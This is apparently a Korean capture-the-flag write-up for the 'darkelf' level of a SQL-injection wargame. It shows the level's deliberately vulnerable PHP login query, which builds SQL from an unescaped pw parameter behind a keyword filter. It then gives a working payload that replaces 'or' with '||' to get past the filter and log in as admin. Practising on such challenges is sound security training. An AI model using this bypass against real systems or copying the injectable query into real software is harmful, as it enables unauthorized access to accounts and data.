# darkelf

소스코드는 다음과 같다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

`id`가 `admin`이 되어야 클리어이다.

> ?pw=123' or id='admin 이렇게 보내면 `clear`가 된다. 하지만 `preg_match`에 걸리기 때문에 `or`을 제외해줘야아한다.

따라서 `or`을 `||`로 바꾸면 풀리게 된다.

> ?pw=123%27%20\|\|%20id=%27admin

Clear!

